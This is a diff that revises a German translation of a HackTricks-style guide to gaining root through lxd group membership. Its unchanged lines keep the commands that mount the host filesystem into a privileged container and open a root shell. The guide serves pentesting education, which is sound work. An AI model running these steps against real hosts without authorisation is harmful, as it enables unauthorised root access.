@@ -1,16 +1,18 @@
 # lxd/lxc-Gruppe - Privilege escalation
 
-Die Mitgliedschaft in der LXD management group des Hosts (normalerweise _**lxd**_) kann einen Weg zu root ermöglichen, da sie vollständige Kontrolle über den daemon erlaubt.<sup>[[1]](#references)</sup>
+{{#include ../../../banners/hacktricks-training.md}}
+
+Die Mitgliedschaft in der LXD management group des Hosts (normalerweise _**lxd**_) kann einen Weg zu root ermöglichen, da sie die vollständige Kontrolle über den daemon erlaubt.<sup>[[1]](#references)</sup>
 
 ## Exploiting ohne Internet
 
 ### Method 1
 
-Du kannst ein Alpine image aus einem vertrauenswürdigen repository herunterladen, um es mit LXD zu verwenden.  
-Canonical's LXD image server veröffentlicht tägliche Builds: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
-Lade einfach sowohl **lxd.tar.xz** als auch **rootfs.squashfs** aus dem neuesten Build herunter (der Verzeichnisname ist das Datum).<sup>[[8]](#references)</sup>
+Du kannst ein Alpine image zur Verwendung mit LXD aus einem vertrauenswürdigen Repository herunterladen.
+Der Canonical-LXD image server veröffentlicht tägliche Builds: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
+Lade einfach **lxd.tar.xz** und **rootfs.squashfs** aus dem neuesten Build herunter (der Verzeichnisname entspricht dem Datum).<sup>[[8]](#references)</sup>
 
-Alternativ kannst du distrobuilder auf deinem Computer installieren, indem du den [project instructions](https://github.com/lxc/distrobuilder) folgst.<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
+Alternativ kannst du distrobuilder auf deinem Rechner installieren, indem du den [project instructions](https://github.com/lxc/distrobuilder) folgst.<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
 ```bash
 # Install requirements
 sudo apt update
@@ -49,10 +51,10 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
-> Führe **`lxd init`** aus, richte einen standardmäßigen storage pool ein und wiederhole anschließend den vorherigen Befehlsblock.<sup>[[2]](#references)</sup>
+> Wenn dieser Fehler _**Error: No storage pool found. Please create a new storage pool**_ auftritt,\
+> führe **`lxd init`** aus, richte einen standardmäßigen Speicherpool ein und wiederhole anschließend den vorherigen Befehlsabschnitt.<sup>[[2]](#references)</sup>
 
-Starte schließlich den Container und öffne eine root shell auf dem Host-Dateisystem:<sup>[[1]](#references)[[2]](#references)</sup>
+Starte schließlich den Container und öffne eine root-Shell auf dem Host-Dateisystem:<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
@@ -60,7 +62,7 @@ lxc exec privesc /bin/sh
 ```
 ### Methode 2
 
-Erstelle ein Alpine-Image und starte es mit dem Flag `security.privileged=true`, wodurch Container-root auf Host-root abgebildet wird; das Mounten von `/` macht anschließend das Host-Dateisystem innerhalb des Containers zugänglich.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
+Erstelle ein Alpine-Image und starte es mit dem Flag `security.privileged=true`, das den Container-Root dem Host-Root zuordnet; das Mounten von `/` legt anschließend das Host-Dateisystem im Container offen.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -82,13 +84,13 @@ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursiv
 ```
 ## References
 
-- [1] [Sicherheit für LXD härten](https://canonical.com/lxd/docs/latest/howto/security_harden/)
+- [1] [So härten Sie die Sicherheit für LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
 - [2] [LXD-Container und virtuelle Maschinen](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
-- [3] [So kopiert und importiert man Images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
+- [3] [So kopieren und importieren Sie Images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
 - [4] [distrobuilder](https://github.com/lxc/distrobuilder)
-- [5] [So erstellt man Images mit distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
+- [5] [So erstellen Sie Images mit distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
 - [6] [Alpine-Image-Definition](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
-- [7] [Build-Script für lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
+- [7] [lxd-alpine-builder-Build-Skript](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
 - [8] [LXD-Image-Server](https://images.lxd.canonical.com/)
 - [9] [Typ: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
 {{#include ../../../banners/hacktricks-training.md}}
